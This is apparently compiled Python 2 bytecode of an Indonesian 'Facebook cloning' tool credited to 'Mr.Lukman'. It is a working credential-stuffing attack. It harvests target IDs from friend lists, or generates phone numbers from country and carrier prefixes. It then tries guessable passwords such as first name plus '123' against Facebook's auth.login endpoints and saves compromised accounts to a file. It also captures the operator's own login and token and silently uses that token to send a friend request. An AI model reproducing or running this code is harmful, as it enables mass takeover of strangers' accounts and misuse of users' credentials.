�
-U7`c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d � xJ e
 d � D]< Z e j d d � Z e d d � e _ e GHe j j �  q� Wy d  d l Z Wn e k
 re  j d � n Xy d  d l Z Wn8 e k
 ree  j d	 � e j d
 � e  j d � n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d
 l m Z d  d l m Z e e � e j d � e j �  Z e j  e! � e j" e j# j$ �  d d
 �d d f g e _% d d f g e _% d �  Z& d �  Z' d �  Z( d �  Z) d Z* d Z+ d Z, d Z- d Z. d Z/ d Z0 d  GHd! Z1 d" Z2 d# Z3 d$ Z4 xy e4 d$ k r�e5 d% � Z6 e6 e2 k rse5 d& � Z7 e7 e3 k r^d' e6 GHd( Z4 n d) GHe  j d* � n d+ GHe  j d* � qWd, �  Z8 d- Z9 g  Z: g  Z; g  a< g  Z= g  Z> g  Z? g  Z@ g  ZA g  ZB g  ZC g  ZD g  ZE g  ZF g  ZG g  ZH g  ZI g  ZJ g  Z> d. ZK d/ ZL d- Z9 g  ZM g  ZN g  ZO g  a< g  ZP g  Z@ g  ZA g  ZQ g  ZR g  ZS g  Z= g  ZC g  ZT g  ZE g  ZF g  ZU g  ZV g  ZW g  ZX g  ZY d. ZK d/ ZL d0 �  ZZ d1 �  Z[ d2 �  Z\ d3 �  Z] d4 �  Z^ d5 �  Z_ d6 �  Z` d7 �  Za d8 �  Zb d9 �  Z_ d: �  Zc ed d; k re[ �  n  d S(<   i����Ns   rm -rf .txti'  iG� i�� s   .txtt   as   pip2 install requestss   pip2 install mechanizei   s   python2 Mr.Lukman.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j �  d  S(   Ns   Selamat Tinggal Asw (   t   ost   syst   exit(    (    (    s   816.pyt   keluar,   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t | � d � | 7} q Wt | � S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   816.pyt   acak0   s
    
0c         C   s~   d } xA | D]9 } | j  | � } | j d | d t d | � � } q
 W| d 7} | j d d � } t j j | d � d  S(   NR
   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR
   (    (    s   816.pyR   8   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���MbP?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   816.pyt   jalanB   s    
s   [1;94ms   [1;91ms   [1;92ms   [1;97ms   [1;96ms   [1;95ms   [1;93ms3  
[1;96m
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████░░████░░░░░░░░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████▄▄████░░░████░░░░░░░
░░░░░░░░██████████░░░████░░░░░░░
░░░░░░░░████▀▀████░░░████░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░s
  
[1;91m  ▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄
[1;91m  ▒▒▒▒▒▒▒▒▒▄██████     ▄▄▄█▄
[1;91m  ▒▒▒▒▒▒▒▄██▀░░▀██▄    ███████▄
[1;91m  ▒▒▒▒▒▒███░░░░░░███   ▐▌    ▀▀██▄▄
[1;91m  ▒▒▒▒▒▄██▌░░░░░░░██   ▐▌        ▀█▄
[1;91m  ▒▒▒▒▒███░░▐█░█▌░██   █▌      ..  ▀▌
[1;91m  ▒▒▒▒████░▐█▌░▐█▌██   ██[1;93m
[1;91m  ▒▒▒▐████░▐░░░░░▌██   █▌
[1;91m  ▒▒▒▒████░░░▄█░░░██   █
[1;91m  ▒▒▒▒████░░░██░░██▌   █▌
[1;91m  ▒▒▒▒████▌░▐█░░███    █
[1;91m  ▒▒▒▒▐████░░▌░███     █
[1;97m  ▒▒▒▒▒████░░░███      █▌
[1;97m  ▒▒▒██████▌░████     ██
[1;97m  ▒▐████████████▒    ██
[1;97m  ▒█████████████▄████
[1;97m  ██████████████████
[1;97m  ██████████████████
[1;97m  █████████████████▀
[1;97m    ┌───────────────────────────────────────────────────────────────┐
[1;97m    │                                                               │
[1;97m    │                        ┏━┓┏┓ ┏━┓╻ ╻╺┳╸                        │
[1;97m    │                        ╹ ╹┗━┛┗━┛┗━┛ ╹                         │
[1;97m    │                                                               │
[1;97m    │ >>  secript ini Tidak Menggunakan Login FB                    │
[1;97m    │     Kalo Anda Ingin Menggunakan Login FB/Token Sihlakan       │
[1;97m    │                                                               │
[1;97m    │ >>  Author   :  Mr.Lukman                                     │
[1;97m    │     Github   :  https://github.com/CYBER X507                 │
[1;97m    │                                                               │
[1;97m    └───────────────────────────────────────────────────────────────┘
[1;96m⊱══════════⊱═⊰Anonymous ⊱══════════⊱═⊰
>>[1;92m Selamat Datang Di Script [1;91m([1;97mMr.Lukman[1;91m) 
s	   Mr.Lukmant	   Anonymoust   trues0   [1;96m[☆] [1;97mKETIK Mr.Lukman [1;96m>>>> s0   [1;96m[☆] [1;97mKETIK Anonymous [1;96m>>>> s   Logged in successfully as t   falses   Salah Tolol! Ketik Anonymouss@   xdg-open https://www.facebook.com/profile.php?id=100060845318179s   Salah Tolol! Ketik Mr.Lukmanc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s   
[1;93mMohon Tunggu [1;93mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   816.pyt   tik�   s
    
 
 i    s
   [31mNot Vulns	   [32mVulnc           C   s   t  j d � t �  d  S(   Nt   clear(   R   t   systemt   login(    (    (    s   816.pyt   lisensi�   s    
c           C   s�   t  j d � t GHt d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d	 GHt j d � d
 GHt d � t �  d  S(   NR)   s�   [1;97m⊱⋕⊰══════════════════════════════════════⊱⋕⊰sW   [1;91m>>>[1;91m[1][1;92m Cloning Semua Negara [1;91m([1;97mTanpa Fb login[1;91m) g�������?s2   [1;91m>>>[1;91m[2][1;94m Login Pakai Facebook  s4   [1;91m>>>[1;91m[3][1;92m Login Pakai Akses token s-   [1;91m>>>[1;91m[4][1;94m Unduh Akses tokens)   [1;91m>>>[1;91m[5][1;92m Ikuti Fb Sayas(   [1;91m>>>[1;91m[6][1;94m WatssAp Sayas*   [1;91m>>>[1;91m[0][1;96m Keluar        (   R   R*   t   logoR"   R   R   t   pilih_login(    (    (    s   816.pyR+   �   s$    








c          C   s  t  d � }  |  d k r' d GHt �  n� |  d k r= t �  n� |  d k rS t �  n� |  d k ri t �  n� |  d k r� t j d � t �  nu |  d	 k r� t j d
 � t �  nR |  d k r� t j d � t �  n/ t d
 k r� t j d � t	 �  n d GHt
 �  d  S(   Ns)   
[1;92mPilih Nomer═╬══►[1;95mR   s   [1;91mFill in correctlyt   1t   2t   3t   4s_   xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebookt   5s@   xdg-open https://www.facebook.com/profile.php?id=100060845318179t   6s    xdg-open wa.me/+62895-4228-18801t   0s   rm -rf login.txt(   t	   raw_inputR.   t   menut   login1t   tokenzR   R*   R+   t   unikersR	   t   pilih(   t   peak(    (    s   816.pyR.   �   s0    











c          C   s�  t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t j d � t GHt	 d � t	 d � t	 d � t
 d � } t
 d	 � } t	 d � t �  y t j d
 � Wn  t
 j k
 r� d GHt �  n Xt t j _ t j d d
 � | t j d <| t j d <t j �  t j �  } d | k r�y3d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d  6| d 6d! d" 6d# d$ 6} t j d% � } | j | � | j �  } | j i | d& 6� d' } t j | d( | �} t j | j � }	 t d d) � }
 |
 j  |	 d* � |
 j! �  t	 d+ � t  j d, � t j" d- |	 d* � t �  Wq�t j# j$ k
 r�d GHt �  q�Xn  d. | k r�d/ GHt  j d0 � t j d1 � t �  q�d2 GHt  j d0 � t j d1 � t% �  n Xd  S(3   NR)   s	   login.txtt   rg�������?s�   [1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰sB   [1;96m[✾][1;91mJANGAN GUNAKAN AKUN OLD UNTUK LOGIN[1;96m[✾]sE   [1;96m[✾][1;91mGUNAKAN AKUN BARU BUAT/LOGIN FIA TOKEN[1;96m[✾]s,   [1;96m[!!] [0;34mID/Email [1;91m: [1;92ms,   [1;96m[!!] [0;34mPassword [1;91m: [1;92ms   https://m.facebook.coms'   
[1;97mThere is no internet connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR/   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR5   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens   
[1;95mLogin Successful...s7   xdg-open https://www.facebook.com/cicicyber.squadindo.7sM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=t
   checkpoints/   
[1;97mSepertinya Akun Anda Terkena Checkpoints   rm -rf login.txti   s!   
[1;93mPassword/Email Anda Salah(&   R   R*   t   openR7   t   KeyErrort   IOErrorR   R   R-   R"   R6   R(   t   brt	   mechanizet   URLErrorR	   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R+   (   t   tokett   idt   pwdt   urlRO   t   dataR
   R    R=   R    R:   (    (    s   816.pyR8     sp    









S








c          C   s�   t  j d � t GHt d � }  y` t j d |  � } t j | j � } | d } t	 d d � } | j
 |  � | j �  t �  WnU t
 k
 r� d GHt d � } | d	 k r� t �  q� | d
 k r� t �  q� t �  n Xd  S(   NR)   sT   [1;91m[+][1;92mToken[1;91m :[1;95mMasukkan tautan token accees tanpa login Fb>> s+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s   [1;91m[!] SalahsG   [1;91m[?] [1;92mAnda Tau token? Kalo Tidak Tau Pm Saya![1;97m[y/n]: R   t   y(   R   R*   R-   R6   Rd   Re   Rf   Rg   Rh   RS   R   Ri   R7   RT   R	   R+   (   Rl   t   otwR    t   namat   zeddR!   (    (    s   816.pyR9   =  s&    






c          C   s�  t  j d � y t d d � j �  }  WnD t k
 rl t  j d � d GHt  j d � t j d � t �  n Xyv t j	 d |  � } t
 j | j � } | d } | d	 } t j	 d
 |  � } t
 j | j � } t
 | d d � } Wnf t k
 r)t  j d � d
 GHt  j d � t j d � t �  n# t j j k
 rKd GHt �  n Xt  j d � t GHt d � d | d GHd | d GHd | d GHt d � d GHd GHt �  d  S(   NR)   s	   login.txtR=   s   [1;94mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=Rq   Rm   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts.   [1;97mSepertinya Akun Anda Terkena Checkpoints&   [1;94mThere is no internet connections�   [1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰s*     [1;36;40m[1;32;40m[*] Name[1;32;40m: s     	   [1;36;40ms*     [1;36;40m[1;32;40m[*] ID  [1;32;40m: s           [1;36;92ms*     [1;36;40m[1;32;40m[*] Subs[1;32;40m: s              [1;36;92ms&   [1;32;98m[1] [1;96m>> Mulai Cloning s   [1;32;98m[0] [1;96m>> Keluar(   R   R*   RS   t   readRU   R   R   R+   Rd   Re   Rf   Rg   Rh   R   RT   Rk   R   R	   R-   R"   R;   (   Rl   R'   R    Rt   Rm   t   tR   t   sub(    (    s   816.pyR7   S  sH    

















c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r= t �  n} |  d k r� t j d � t GHd GHt j d � t  d	 � t �  n9 |  d
 k r� t d � t j d � t �  n d GHt �  d  S(
   Ns   
[1;31;40m>>> [1;35;40mR   s   [1;91mFill in correctlyR/   R0   R)   s�   [1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰
s   git pull origin masters   
[1;91m[ [1;97mBack [1;91m]R5   s
   Token Removeds   rm -rf login.txt(	   R6   R;   t   superR   R*   R-   R7   R"   R	   (   R:   (    (    s   816.pyR;   y  s&    








c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt
 d � t
 d	 � d GHt �  d  S(
   NR)   s	   login.txtR=   s   [1;91mToken invalids   rm -rf login.txti   s�   [1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰
s3   [1;32;92m[1] [1;33;98m>> Hack Daftar Teman Publiks!   [1;32;36m[0] [1;33;96m>> Keluar(   R   R*   RS   Rx   Rl   RU   R   R   R+   R-   R"   t   pilih_super(    (    (    s   816.pyR{   �  s    






c          C   s  t  d � }  |  d k r' d GHt �  n|  d k rt j d � t GHd GHt  d � } y> t j d | d	 t � } t j	 | j
 � } d
 | d GHWn' t k
 r� d GHt  d
 � t �  n Xd GHt j d | d t � } t j	 | j
 � } xH | d D] } t
 j | d � q� Wn" |  d k r/t �  n d GHt �  d t t t
 � � GHt d � d d d g } x0 | D]( } d | Gt j j �  t j d � qpWd GHd GHd �  }	 t d � }
 |
 j |	 t
 � d GHd GHd t t t � � d  t t t � � GHd! GHt  d" � t �  d  S(#   Ns   
[1;31;40m>>> [1;97mR   s   [1;91mFill in correctlyR/   R)   s�   [1;96m⊱⋕⊰═══════════════════════════════════════⊱⋕⊰
s5   [1;96m[⊱⋕⊰][1;93m Enter ID/USERNAME[1;91m : s   https://graph.facebook.com/s   ?access_token=s   [1;31;37m[⊱⋕⊰] Name : Rq   s    [1;37m[⊱⋕⊰] ID Not Found!s   
[1;96m[[1;94mBack[1;96m]s>   [1;35;37m[⊱⋕⊰] Jangan Dulu Keluar Peler Lagi Proses... s   /friends?access_token=Rp   Rm   R5   s(   [1;36;96m[⊱⋕⊰] Total ID : [1;92ms#   [1;34;96m[⊱⋕⊰] Mohon Tunggu s   .   s   ..  s   ... s%   
[1;32;40m[⊱⋕⊰] Cloning[1;93mi   sC   
[1;94m   ❈     [1;91mTo Stop Process Press CTRL+Z [1;94m  ❈s�   [1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰c         S   sc  |  } y t  j d � Wn t k
 r* n Xy*t j d | d t � } t j | j � } | d d } t	 j
 d | d | d � } t j | � } d	 | k r� d
 | d | GHt j
 | | � n�d | d
 k r/d | d | GHt d d � } | j | d | d � | j �  t j
 | | � n%| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d
 | d | GHt j
 | | � n�d | d
 k rd | d | GHt d d � } | j | d | d � | j �  t j
 | | � nQ| d d }	 t	 j
 d | d |	 d � } t j | � } d	 | k rpd
 | d |	 GHt j
 | |	 � n�d | d
 k r�d | d |	 GHt d d � } | j | d |	 d � | j �  t j
 | |	 � n}| d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k rDd | d |
 GHt j
 | |
 � nd | d
 k r�d | d |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k rd | d | GHt j
 | | � n<d | d
 k rd | d | GHt d d � } | j | d | d � | j �  t j
 | | � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � nhd | d
 k rSd | d | GHt d d � } | j | d | d � | j �  t j
 | | � nt j d | d t � } t j | j � } | d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k r�d | d |
 GHt j
 | |
 � ng d | d
 k rTd | d |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   786s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RQ   s'   [1;96m[[1;92mValid_OK[1;58m][1;97m s    [1;96m|[1;97m s   www.facebook.comt	   error_msgs)   [1;96m[[1;93mInvalid_CP[1;58m][1;97m s   out/checkpoint.txtR    t   |s   
t   123s)   [1;96m[[1;93mInvalid_CP[1;12m][1;97m t   1234t   12345s'   [1;96m[[1;92mValid_OK[1;58m][1;58m s)   [1;96m[[1;93mInvalid_CP[1;58m][1;58m t   123456s'   [1;96m[[1;92mValid_OK[1;96m][1;97m s    [1;58m|[1;97m s)   [1;96m[[1;93mInvalid_CP[1;96m][1;97m t	   last_name(   R   t   mkdirt   OSErrorRd   Re   Rl   Rf   Rg   Rh   t   urllibt   urlopent   loadt   okst   appendRS   R   Ri   t   cekpoint(   t   argt   userR    R   t   pass1Rp   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   816.pyt   main�  s�    







i   sC   [1;96m[[1;97m✓[1;96m] [1;92mProcess Telah Selesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93msL   [1;96m[+] [1;92mCP File Sudah Tersimpan [1;91m: [1;97mout/checkpoint.txts   
[1;96m[[1;97mBack[1;96m](   R6   R|   R   R*   R-   Rd   Re   Rl   Rf   Rg   Rh   RT   R{   Rm   R�   R7   R   R   R"   R   R   R   R   R   R   t   mapR�   R�   (   R<   t   idtt   jokt   opR=   R    R   R&   R'   R�   t   p(    (    s   816.pyR|   �  sX    






 
 	s)
c           C   s�   t  j d � t GHd d GHd GHd GHd GHd GHd GHd	 GHd
 GHd GHd GHd
 GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd d GHt �  d  S(   NR)   i*   s   [1;91m=sG   [1;94m[1][1;91m  Bangladesh   [1;91m⇋  [1;94m[20][1;97m  AlbaniasG   [1;94m[2][1;91m  USA          [1;91m⇋  [1;94m[21][1;97m  AlgeriasG   [1;94m[3][1;91m  UK           [1;91m⇋  [1;94m[22][1;97m  AndorrasG   [1;94m[4] [1;91m India        [1;91m⇋  [1;94m[23][1;97m  ArmeniasG   [1;94m[5][1;91m  Brazil       [1;91m⇋  [1;94m[24][1;97m  GeorgiasG   [1;94m[6][1;91m  Japan        [1;91m⇋  [1;94m[25][1;97m  IcelandsE   [1;94m[7][1;91m  Korea        [1;91m⇋  [1;94m[26][1;97m  ChinasF   [1;94m[8][1;91m  Italy        [1;91m⇋  [1;94m[27][1;97m  BhutansH   [1;94m[9][1;91m  Spain        [1;91m⇋  [1;94m[28][1;97m  MongoliasK   [1;94m[10][1;91m Poland       [1;91m⇋  [1;94m[29][1;97m  New ZealandsE   [1;94m[11][1;91m Pakistan     [1;91m⇋  [1;94m[30][1;97m  Sudans[   [1;94m[12][1;91m Indonisia    [1;91m⇋  [1;94m[+][1;97m   Pak Nbr Fb Clone[1;94m[+] sG   [1;94m[13][1;91m Iran         [1;91m⇋  [1;94m[A][1;97m   TelenorsD   [1;94m[14][1;91m Grecee       [1;91m⇋  [1;94m[B][1;97m   ZongsD   [1;94m[15][1;91m Afghanistan  [1;91m⇋  [1;94m[C][1;97m   Jazzs^   [1;94m[16][1;91m Syria        [1;91m⇋  [1;94m[+][1;97m   Bangal Nbr Fb Clone[1;94m[+] sK   [1;94m[17][1;91m Turky        [1;91m⇋  [1;94m[D][1;97m   Airtel/RobisL   [1;94m[18][1;91m Iraq         [1;91m⇋  [1;94m[E][1;97m   GrameenphonesJ   [1;94m[19][1;91m France       [1;91m⇋  [1;94m[F][1;97m   Banglalinks   [0][1;97m  Keluar            (   R   R*   R-   t   action(    (    (    s   816.pyR7   C  s2    
		c             s�  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q{ WWq�t
 k
 r� d GHt  d � t �  q�Xn�|  d
 k ret j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qWWq�t
 k
 rad GHt  d � t �  q�XnA|  d k rt j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r d GHt  d � t �  q�Xn�|  d k r�t j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qXWWq�t
 k
 r�d GHt  d � t �  q�Xn|  d k rBt j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r>d GHt  d � t �  q�Xnd|  d k r�t j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r�d GHt  d � t �  q�Xn�|  d k r�t j d � t GHd GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q5WWq�t
 k
 r|d GHt  d � t �  q�Xn&|  d  k rt j d � t GHd! GHyO t  d � �  d" � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 rd GHt  d � t �  q�Xn�|  d# k r�t j d � t GHd$ GHyO t  d � �  d% � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qsWWq�t
 k
 r�d GHt  d � t �  q�Xn�|  d& k r]t j d � t GHd' GHyO t  d � �  d( � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qWWq�t
 k
 rYd GHt  d � t �  q�XnI|  d) k r�t j d � t GHd* GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r�d GHt  d � t �  q�Xn�|  d+ k r�t j d � t GHd, GHyO t  d � �  d � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qPWWq�t
 k
 r�d GHt  d � t �  q�Xn|  d- k r:t j d � t GHd. GHyO t  d � �  d/ � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r6d GHt  d � t �  q�Xnl|  d0 k r�t j d � t GHd1 GHyO t  d � �  d2 � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r�d GHt  d � t �  q�Xn�
|  d3 k rx	t j d � t GHd4 GHyO t  d � �  d5 � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q-	WWq�t
 k
 rt	d GHt  d � t �  q�Xn.
|  d6 k r
t j d � t GHd7 GHyO t  d � �  d8 � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�	WWq�t
 k
 r
d GHt  d � t �  q�Xn�|  d9 k r�
t j d � t GHd: GHyO t  d � �  d; � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qk
WWq�t
 k
 r�
d GHt  d � t �  q�Xn�|  d< k rUt j d � t GHd= GHyO t  d � �  d> � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q
WWq�t
 k
 rQd GHt  d � t �  q�XnQ|  d? k r�t j d � t GHd@ GHyO t  d � �  dA � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r�d GHt  d � t �  q�Xn�
|  dB k r�t j d � t GHdC GHyO t  d � �  dD � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qHWWq�t
 k
 r�d GHt  d � t �  q�Xn
|  dE k r2
t j d � t GHdF GHyO t  d � �  dG � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r.
d GHt  d � t �  q�Xnt	|  dH k r�
t j d � t GHdI GHyO t  d � �  dJ � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�
WWq�t
 k
 r�
d GHt  d � t �  q�Xn�|  dK k rpt j d � t GHdL GHyO t  d � �  dM � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q%WWq�t
 k
 rld GHt  d � t �  q�Xn6|  dN k rt j d � t GHdO GHyO t  d � �  dP � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 rd GHt  d � t �  q�Xn�|  dQ k r�t j d � t GHdR GHyO t  d � �  dS � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qcWWq�t
 k
 r�d GHt  d � t �  q�Xn�|  dT k rMt j d � t GHdU GHyO t  d � �  dV � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qWWq�t
 k
 rId GHt  d � t �  q�XnY|  dW k r�t j d � t GHdX GHyO t  d � �  dY � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r�d GHt  d � t �  q�Xn�|  dZ k r�t j d � t GHd[ GHyO t  d � �  d\ � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q@WWq�t
 k
 r�d GHt  d � t �  q�Xn|  d] k r*t j d � t GHd^ GHyO t  d � �  d_ � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r&d GHt  d � t �  q�Xn||  d` k r�t j d � t GHda GHyO t  d � �  db � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q~WWq�t
 k
 r�d GHt  d � t �  q�Xn�|  dc k rht j d � t GHdd GHyO t  d � �  de � d	 } x0 t | d
 � j �  D] } t j | j	 �  � qWWq�t
 k
 rdd GHt  d � t �  q�Xn>|  df k rt j d � t GHdg GHyO t  d � �  de � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 rd GHt  d � t �  q�Xn�|  dh k r�t j d � t GHdi GHyO t  d � �  de � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q[WWq�t
 k
 r�d GHt  d � t �  q�Xn |  dj k rEt j d � t GHdk GHyO t  d � �  dl � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 rAd GHt  d � t �  q�Xna|  dm k r�t j d � t GHdn GHyO t  d � �  dl � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q�WWq�t
 k
 r�d GHt  d � t �  q�Xn� |  do k r�t j d � t GHdp GHyO t  d � �  dl � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q8WWq�t
 k
 rd GHt  d � t �  q�Xn# |  dq k r�t j dr � t �  n  t
 t t � � } ds | GHt j dt � du GHt j dt � dv GHt j dw � dx dy GH�  � f dz �  } t d{ � } | j | t � dx dy GHd| GHd} t
 t t � � d~ t
 t t � � GHd GHt  d� � t j d� � d  S(�   Ns'   
[1;91mPilih Nomer [1;93m>>>[1;95m  R   s   [!] Isi dengan benarR/   R)   s:   [1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199s   [1;96m Masukan Kode  : s   +880s   .txtR=   s   [!] File Not Founds	   
[ Back ]R0   sD   786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708s    Masukan Kode  : s   +1R1   s!   737, 706, 748, 783, 739, 759, 790s   +44R2   sI   954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578s   +91R3   s0   127, 179, 117, 853, 318, 219, 834, 186, 479, 113s   +55R4   s"   11, 12, 19, 16, 15, 13, 14, 18, 17s   +81t   7s   1, 2, 3, 4, 5, 6, 7, 8, 9s   +82t   8s:   388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328s   +39t   9s&   60, 76, 73, 64, 69, 77, 65, 61, 75, 68s   +34t   10s"   66, 69, 78, 79, 60, 72, 67, 53, 51s   +48t   11s   [1;93m01, ~to~~, 49t   12s   [1;93m82,57,89,56,81t   13s7   [1;93m901, 902, 903, 930, 933, 935, 936, 937, 938, 939s   +98t   14s   [1;93m69,693,698,694,695s   +3069t   15s7   [1;96m070, 071, 079, 072, 073, 078, 077, 076, 074, 075s   +93t   16s%   [1;93m11, 21, 57, 41, 15, 52, 31, 23s   +963t   17s(   [1;96m322, 264, 416, 272, 472, 382, 312s   +90t   18s   [1;96m079, 078, 073, 074s   +964t   19s   [1;96m3, 2, 1, 4s   +33t   20s   [1;93m67, 68, 69s   +355t   21s-   [1;96m49, 27, 43, 21,33, 49,26, 34,27,38, 29s   +213t   22s   [1;95m8, 7, 3s   +376t   23s   [1;95m22, 43, 23,53, 46,52, 38s   +374t   24s   [1;95m366, 342, 362,365, 349s   +995t   25s   [1;95m4, 5s   +354t   26s   [1;95m139, 138, 137, 138s   +86t   27s   [1;95m2, 7, 5s   +975t   28s	   [1;95m11s   +976t   29s   [1;95m9, 24s   +64t   30s   [1;95m 21, 41, 183, 81s   +249t   As*   [1;95m 40, 41, 42, 43, 44, 45, 46, 47, 48s   +92t   Bs*   [1;91m 10, 11, 12, 13, 14, 15, 16, 17, 18t   Cs"   [1;91m 00, 01, 02, 03, 04, 05, 06t   Ds   [1;91m 16, 17, 18s   +80t   Es   [1;91m 13, 14, 15,16, 18t   Fs   [1;91m 